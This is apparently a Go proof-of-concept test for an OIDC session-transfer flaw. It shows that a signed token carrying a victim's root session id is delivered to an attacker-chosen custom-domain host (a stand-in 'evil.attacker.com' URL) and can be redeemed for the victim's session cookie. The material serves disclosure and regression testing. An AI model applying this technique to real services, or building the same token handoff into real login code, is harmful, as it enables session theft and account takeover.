package authn

import (
	"testing"
	"github.com/stretchr/testify/require"
)

// PoC for OIDC-SESSIONXFER-001: the OIDC login flow hands this signed token — which carries the
// victim's ROOT session id — to the attacker-chosen `continue` host (any registered custom domain,
// unverified). Whoever receives the token can present it to /api/trust/v1/session-transfer and be
// issued the victim's session cookie. This test proves the token is a full-session bearer credential
// delivered in the URL and that it round-trips.
func TestSessionXfer_TokenCarriesVictimRootSession(t *testing.T) {
	const secret = "server-cookie-secret"
	victimRootSession := "session_VICTIM_ROOT_abc123"
	attackerHost := "https://evil.attacker.com/api/trust/v1/session-transfer"

	// The server signs the victim's root session id + the attacker-controlled continue URL.
	token, err := SignSessionTransfer(victimRootSession, attackerHost, secret)
	require.NoError(t, err)

	// The attacker captures `token` from the redirect URL and presents it back.
	claims, err := VerifySessionTransfer(token, secret)
	require.NoError(t, err, "captured token verifies with the server secret")
	require.Equal(t, victimRootSession, claims.SessionID,
		"token yields the VICTIM's root session id => whoever holds it gets the victim's session cookie")
	t.Logf("SESSIONXFER CONFIRMED: signed token delivered to attacker host %q carries victim root session %q => account takeover.",
		attackerHost, claims.SessionID)
}
